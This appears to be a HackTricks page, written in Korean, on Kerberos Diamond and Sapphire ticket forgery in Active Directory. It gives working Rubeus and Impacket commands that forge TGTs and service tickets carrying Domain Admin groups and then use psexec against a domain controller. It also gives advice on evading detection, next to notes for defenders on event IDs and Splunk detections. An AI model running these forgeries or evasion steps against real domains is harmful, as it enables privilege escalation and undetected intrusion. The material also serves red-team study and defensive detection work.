# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**golden ticket처럼**, diamond ticket은 **어떤 사용자로서든 어떤 서비스에 접근할 수 있는** TGT입니다. golden ticket은 완전히 오프라인에서 위조되어 해당 도메인의 krbtgt 해시로 암호화된 뒤 로그온 세션에 주입되어 사용됩니다. 도메인 컨트롤러는 자신이 합법적으로 발급한 TGT들을 추적하지 않기 때문에, 자체 krbtgt 해시로 암호화된 TGT를 문제없이 수락합니다.

golden ticket 사용을 탐지하는 일반적인 기법은 두 가지입니다:

- 해당하는 AS-REQ가 없는 TGS-REQ를 찾아보는 것.
- Mimikatz의 기본 10년 수명과 같이 비정상적인 값이 설정된 TGT를 찾아보는 것.

diamond ticket은 DC가 발급한 합법적인 TGT의 필드를 수정하여 만들어집니다. 이는 TGT를 요청하고, 도메인의 krbtgt 해시로 이를 복호화한 다음 티켓의 원하는 필드를 수정하고 다시 암호화함으로써 달성됩니다. 이렇게 하면 golden ticket의 앞서 언급한 두 가지 단점을 극복할 수 있습니다:

- TGS-REQ는 앞서 발생한 AS-REQ를 갖게 됩니다.
- TGT가 DC에 의해 발급되었기 때문에 도메인의 Kerberos 정책에서 요구하는 모든 올바른 세부 정보가 포함됩니다. 이러한 내용은 golden ticket에서도 정확히 위조할 수는 있지만, 훨씬 복잡하고 실수할 가능성이 큽니다.

### 요구사항 및 워크플로우

- **Cryptographic material**: TGT를 복호화하고 재서명하기 위해 필요한 krbtgt AES256 키(권장) 또는 NTLM 해시.
- **Legitimate TGT blob**: `/tgtdeleg`, `asktgt`, `s4u`로 획득하거나 메모리에서 티켓을 내보내어 얻은 합법적인 TGT 블롭.
- **Context data**: 대상 사용자 RID, 그룹 RIDs/SIDs, (선택적) LDAP에서 파생한 PAC 속성들.
- **Service keys** (only if you plan to re-cut service tickets): 가장한 서비스 SPN의 AES 키.

1. AS-REQ를 통해 제어 가능한 사용자에 대한 TGT를 획득합니다 (Rubeus의 `/tgtdeleg`는 자격증명 없이 클라이언트가 Kerberos GSS-API 플로우를 수행하도록 강제하기 때문에 편리합니다).
2. 반환된 TGT를 krbtgt 키로 복호화하고 PAC 속성(사용자, 그룹, 로그온 정보, SIDs, 디바이스 클레임 등)을 패치합니다.
3. 동일한 krbtgt 키로 티켓을 재암호화/서명하고 현재 로그온 세션에 주입합니다(`kerberos::ptt`, `Rubeus.exe ptt` 등).
4. 선택적으로, 유효한 TGT 블롭과 대상 서비스 키를 제공하여 서비스 티켓에 대해 동일한 과정을 반복하면 네트워크 상에서 더 은밀하게 활동할 수 있습니다.

### 업데이트된 Rubeus 트레이드크래프트 (2024+)

Huntress의 최근 작업으로 Rubeus 내부의 `diamond` 액션이 modernize되었고, 이전에 golden/silver tickets에만 존재하던 `/ldap` 및 `/opsec` 개선사항들이 포팅되었습니다. `/ldap`는 이제 LDAP 쿼리와 SYSVOL 마운트를 통해 실제 PAC 컨텍스트를 가져와 계정/그룹 속성 및 Kerberos/암호 정책(예: `GptTmpl.inf`)을 추출하며, `/opsec`는 두 단계의 preauth 교환을 수행하고 AES-only 및 현실적인 KDCOptions를 강제하여 AS-REQ/AS-REP 플로우가 Windows와 일치하도록 만듭니다. 이는 누락된 PAC 필드나 정책과 불일치하는 수명과 같은 명백한 지표를 크게 줄여줍니다.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (with optional `/ldapuser` & `/ldappassword`) 대상 사용자의 PAC 정책 데이터를 미러링하기 위해 AD와 SYSVOL을 쿼리합니다.
- `/opsec` Windows와 유사한 AS-REQ 재시도를 강제하며, 소음을 유발하는 플래그를 0으로 설정하고 AES256을 고수합니다.
- `/tgtdeleg` 피해자의 평문 비밀번호나 NTLM/AES 키에 손대지 않으면서도 복호화 가능한 TGT를 반환합니다.

### Service-ticket recutting

동일한 Rubeus 업데이트는 diamond technique을 TGS blobs에 적용하는 기능을 추가했습니다. `diamond`에 **base64-encoded TGT**(`asktgt`, `/tgtdeleg`, 또는 이전에 위조된 TGT에서 가져온), **service SPN**, 및 **service AES key**를 공급하면 KDC를 건드리지 않고도 현실감 있는 service tickets를 생성할 수 있습니다 — 사실상 더 은밀한 silver ticket입니다.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
이 워크플로우는 이미 service account key를 제어하고 있을 때(예: `lsadump::lsa /inject` 또는 `secretsdump.py`로 덤프한 경우)에, 새로운 AS/TGS 트래픽을 발생시키지 않고 AD 정책, 타임라인, 및 PAC 데이터와 정확히 일치하는 일회성 TGS를 생성하려는 경우에 이상적입니다.

### Sapphire-style PAC swaps (2025)

때때로 **sapphire ticket**이라고 불리는 최신 변형은 Diamond의 "real TGT" 기반에 **S4U2self+U2U**를 결합하여 권한이 높은 PAC을 탈취해 자신의 TGT에 삽입합니다. 추가적인 SID를 만들어내는 대신, 낮은 권한의 요청자를 대상으로 하는 `sname`을 지정하여 고권한 사용자에 대해 U2U S4U2self 티켓을 요청합니다; KRB_TGS_REQ는 요청자의 TGT를 `additional-tickets`에 포함시키고 `ENC-TKT-IN-SKEY`를 설정하여 해당 사용자의 키로 서비스 티켓을 복호화할 수 있게 합니다. 그런 다음 권한 있는 PAC을 추출해 합법적인 TGT에 결합한 뒤 krbtgt 키로 재서명합니다.

Impacket의 `ticketer.py`는 이제 `-impersonate` + `-request` (live KDC exchange)를 통해 sapphire 지원을 제공합니다:
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
- `-impersonate`는 사용자 이름 또는 SID를 허용합니다; `-request`는 티켓을 복호화/패치하기 위해 live user creds와 krbtgt 키 재료(AES/NTLM)가 필요합니다.

Key OPSEC tells when using this variant:

- TGS-REQ는 `ENC-TKT-IN-SKEY`와 `additional-tickets`(피해자 TGT)를 포함합니다 — 정상 트래픽에서는 드뭅니다.
- `sname`은 종종 요청 사용자(셀프서비스 접근)와 동일하며 Event ID 4769는 호출자와 대상이 동일한 SPN/사용자로 표시됩니다.
- 같은 클라이언트 컴퓨터에서 4768/4769 항목이 쌍으로 기록되지만 서로 다른 CNAME(저권한 요청자 vs. 권한 있는 PAC 소유자)을 보일 것으로 예상하세요.

### OPSEC & detection notes

- 전통적인 hunter 휴리스틱(TGS without AS, decade-long lifetimes)은 golden tickets에 여전히 적용되지만, diamond tickets는 주로 **PAC 내용 또는 그룹 매핑이 불가능해 보일 때** 드러납니다. 자동 비교에서 위조가 즉시 감지되지 않도록 모든 PAC 필드(logon hours, user profile paths, device IDs)를 채워 넣으세요.
- **Do not oversubscribe groups/RIDs**. `512`(Domain Admins)와 `519`(Enterprise Admins)만 필요하다면 거기서 멈추고 대상 계정이 AD의 다른 곳에서도 해당 그룹에 속하는 것이 그럴듯한지 확인하세요. 과도한 `ExtraSids`는 티가 납니다.
- Sapphire-style swaps는 U2U 지문을 남깁니다: `ENC-TKT-IN-SKEY` + `additional-tickets`와 4769에서 사용자(종종 요청자)를 가리키는 `sname`, 그리고 위조된 티켓에서 시작된 후속 4624 로그온. no-AS-REQ 간극만 찾지 말고 이러한 필드들을 연관 지어 보세요.
- Microsoft는 CVE-2026-20833 때문에 **RC4 service ticket issuance**를 단계적으로 중단하기 시작했습니다; KDC에서 AES-only etypes를 강제하면 도메인이 강화되고 diamond/sapphire 도구와도 정합됩니다 (/opsec는 이미 AES를 강제합니다). 위조 PAC에 RC4를 섞으면 점점 더 눈에 띄게 됩니다.
- Splunk의 Security Content 프로젝트는 diamond tickets용 공격 범위 텔레메트리와 *Windows Domain Admin Impersonation Indicator* 같은 탐지를 배포합니다. 이는 비정상적인 Event ID 4768/4769/4624 연속과 PAC 그룹 변경을 연관시킵니다. 해당 데이터셋을 재생하거나(또는 위 명령들로 자체 생성하면) T1558.001에 대한 SOC 커버리지를 검증하고 회피할 구체적인 경보 로직을 얻는 데 도움이 됩니다.

## References

- [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
